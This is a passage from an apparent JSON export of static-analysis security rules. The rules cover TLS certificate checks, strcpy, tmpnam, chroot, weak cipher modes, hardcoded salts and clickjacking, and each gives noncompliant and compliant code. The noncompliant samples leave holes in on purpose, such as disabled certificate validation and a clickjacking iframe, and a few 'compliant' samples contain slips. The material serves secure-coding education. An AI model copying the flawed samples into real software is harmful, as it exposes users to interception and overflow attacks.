&lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks\n{\n    virtual void tls_verify_cert_chain(\n              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,\n              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,\n              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,\n              Botan::Usage_Type usage,\n              const std::string &amp;hostname,\n              const Botan::TLS::Policy &amp;policy)\n    override  { }\n};\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks { };\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5801": {
        "name": "Using \"strcpy\" or \"wcscpy\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to\n<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and\n<code>wcscpy</code>, but they have their own set of issues (see <a href='/coding_rules#rule_key=c%3AS5816'>S5816</a>), and you should probably prefer another more adapted\nalternative.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the source or the destination pointer is <code>null</code> </li>\n  <li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final\n  <code>null</code> character) can be larger than the size of the destination buffer. </li>\n  <li> There is an overlap between source and destination </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to\n  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in\n  FreeBSD </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, src); // Sensitive: might overflow\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char *dest = malloc(strlen(src) + 1); // For the final 0\n  strcpy(dest, src); // Compliant: we made sure the buffer is large enough\n  int r= doSomethingWith(dest);\n  free(dest);\n  return r;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S5824": {
        "name": "Using \"tmpnam\", \"tmpnam_s\" or \"tmpnam_r\" is security-sensitive",
        "htmlDesc": "<p>The functions \"tmpnam\", \"tmpnam_s\" and \"tmpnam_r\" are all used to return a file name that does not match an existing file, in order for the\napplication to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time\nthe application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed\nwere trustworthy.</p>\n<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such\nfunctions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary\nfolder, not a temporary file.</p>\n<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer\noverflow.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that several threads call any of these functions simultaneously </li>\n  <li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights\n  </li>\n  <li> The buffers passed to these functions are respectively smaller than\n    <ul>\n      <li> <code>L_tmpnam</code> for <code>tmpnam</code> </li>\n      <li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li>\n      <li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or\n  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li>\n  <li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file\n  and fails if the file already exists. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *tempData) {\n  char *path = tmpnam(NULL); // Sensitive\n  FILE* f = fopen(tmpnam, \"w\");\n  fputs(tempData, f);\n  fclose(f);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *tempData) {\n  // The file will be opened in \"wb+\" mode, and will be automatically removed on normal program exit\n  FILE* f = tmpfile(); // Compliant\n  fputs(tempData, f);\n  fclose(f);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions\">CERT, CON33-C.</a> - Avoid\n  race conditions when using library functions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.+Do+not+create+temporary+files+in+shared+directories\">CERT, FIO21-C.</a> - Do\n  not create temporary files in shared directories </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5802": {
        "name": "Changing directories improperly when using \"chroot\" is security-sensitive",
        "htmlDesc": "<p>The purpose of creating a jail, the \"virtual root directory\" created with chroot-type functions, is to limit access to the file system by isolating\nthe process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still\naccess to unauthorized resources outside of the \"jail\".</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application changes the working directory before or after running chroot. </li>\n  <li> The application uses a path inside the jail directory as working directory. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Change the current working directory to the root directory after switching to a jail directory.</p>\n<h2>Sensitive Code Example</h2>\n<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>\nfunction:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nchroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value\n</pre>\n<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code\nshould be checked:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nchroot(root_dir); // Sensitive: missing check of the return value\nconst char* any_dir = \"/any/\";\nchdir(any_dir); // Sensitive: missing check of the return value\n</pre>\n<h2>Compliant Solution</h2>\n<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the\nreturn code of both functions:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\n\nif (chdir(root_dir) == -1) {\n  exit(-1);\n}\n\nif (chroot(root_dir) == -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked\n  exit(-1);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/243\">CWE-243 - Creation of chroot Jail Without Changing Working Directory</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chdir.2.html\">man7.org</a> - chdir </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chroot.2.html\">man7.org</a> - chroot </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nImports System.Security.Cryptography\n\nPublic Module Example\n\n    Public Sub Encrypt()\n        Dim Algorithm As New AesManaged() With {\n            .KeySize = 128,\n            .BlockSize = 128,\n            .Mode = CipherMode.ECB, ' Noncompliant\n            .Padding = PaddingMode.PKCS7\n            }\n    End Sub\nEnd Module\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nImports System.Security.Cryptography\n\nPublic Module Example\n\n    Public Sub Encrypt()\n        Dim data(10) As Byte\n        Dim RsaCsp = New RSACryptoServiceProvider()\n        RsaCsp.Encrypt(data, False) ' Noncompliant\n    End Sub\nEnd Module\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nImports System.Security.Cryptography\n\nPublic Module Example\n\n    Public Sub Encrypt()\n        Dim data(10) As Byte\n        Dim Algorithm As New AesGcm(data)\n    End Sub\nEnd Module\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nImports System.Security.Cryptography\n\nPublic Module Example\n\n    Public Sub Encrypt()\n        Dim data(10) As Byte\n        Dim RsaCsp = New RSACryptoServiceProvider()\n        RsaCsp.Encrypt(data, True) ' Noncompliant\n    End Sub\nEnd Module\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S2053": {
        "name": "Password hashing functions should use an unpredictable salt",
        "htmlDesc": "<p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>\n<h2>Why is this an issue?</h2>\n<p>During the process of password hashing, an additional component, known as a \"salt,\" is often integrated to bolster the overall security. This salt,\nacting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>\n<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it\nis too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.\nSimilarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical\npassword hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on\nimplementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>\n<h3>What is the potential impact?</h3>\n<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.\nThis could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>\n<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying\nevery possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt\ncan make the task significantly easier and faster.</p>\n<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully\ncracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>\n<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters\nof password hashes with identical salt that can then be attacked as explained before.</p>\n<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter\nthe salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>\n<h3>Exceptions</h3>\n<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such\nfunctions are:</p>\n<ul>\n  <li> Argon2 </li>\n  <li> PBKDF2 </li>\n  <li> Scrypt </li>\n  <li> Bcrypt </li>\n</ul>\n<p>When they are used for password storage, using a secure, random salt is required.</p>\n<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those\ncases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed\nsalt is safe and accepted.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of hard-coded salts.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nImports System.Security.Cryptography\n\nPublic Sub Hash(Password As String)\n    Dim Salt As Byte() = Encoding.UTF8.GetBytes(\"salty\")\n    Dim Hashed As New Rfc2898DeriveBytes(Password, Salt) ' Noncompliant\nEnd Sub\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nImports System.Security.Cryptography\n\nPublic Sub Hash(Password As String)\n    Dim Hashed As New Rfc2898DeriveBytes(Password, 64)\nEnd Sub\n</pre>\n<h3>How does this work?</h3>\n<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that\nprovides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>\n<p>In the case of the code sample, the class automatically takes care of generating a secure salt if none is specified.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/759\">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/760\">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>In the following example, the callback change impacts the entirety of HTTP requests made by the application.</p>\n<p>The certificate validation gets disabled by overriding <code>ServerCertificateValidationCallback</code> with an empty implementation. It is highly\nrecommended to use the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre>\nImports System.Net\n\nPublic Sub Send()\n    ServicePointManager.ServerCertificateValidationCallback =\n        Function(sender, certificate, chain, errors) True ' Noncompliant\n\n    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(New System.Uri(\"https://example.com\"))\n    request.Method = System.Net.WebRequestMethods.Http.Get\n    Dim response As System.Net.HttpWebResponse = request.GetResponse()\n    response.Close()\nEnd Sub\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5732": {
        "name": "Disabling content security policy frame-ancestors directive is security-sensitive",
        "htmlDesc": "<p><a href=\"https://en.wikipedia.org/wiki/Clickjacking\">Clickjacking</a> attacks occur when an attacker try to trick an user to click on certain\nbuttons/links of a legit website. This attack can take place with malicious HTML frames well hidden in an attacker website.</p>\n<p>For instance, suppose a safe and authentic page of a social network (https://socialnetworkexample.com/makemyprofilpublic) which allows an user to\nchange the visibility of his profile by clicking on a button. This is a critical feature with high privacy concerns. Users are generally well informed\non the social network of the consequences of this action. An attacker can trick users, without their consent, to do this action with the below\nembedded code added on a malicious website:</p>\n<pre>\n&lt;html&gt;\n&lt;b&gt;Click on the button below to win 5000$&lt;/b&gt;\n&lt;br&gt;\n&lt;iframe src=\"https://socialnetworkexample.com/makemyprofilpublic\" width=\"200\" height=\"200\"&gt;&lt;/iframe&gt;\n&lt;/html&gt;\n</pre>\n<p>Playing with the size of the iframe it’s sometimes possible to display only the critical parts of a page, in this case the button of the\n<em>makemyprofilpublic</em> page.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Clickjacking#Clickjacking_categories\">Critical actions</a> of the application are prone to clickjacking\n  attacks because a simple click on a link or a button can trigger them. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Implement content security policy <em>frame-ancestors</em> directive which is supported by all modern browsers and will specify the origins of\nframe allowed to be loaded by the browser (this directive deprecates <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\">X-Frame-Options</a>).</p>\n<h2>Sensitive Code Example</h2>\n<p>In Express.js application the code is sensitive if the <a href=\"https://www.npmjs.com/package/helmet-csp\">helmet-csp</a> or <a\nhref=\"https://www.npmjs.com/package/helmet\">helmet</a> middleware is used without the <code>frameAncestors</code> directive (or if\n<code>frameAncestors</code> is set to 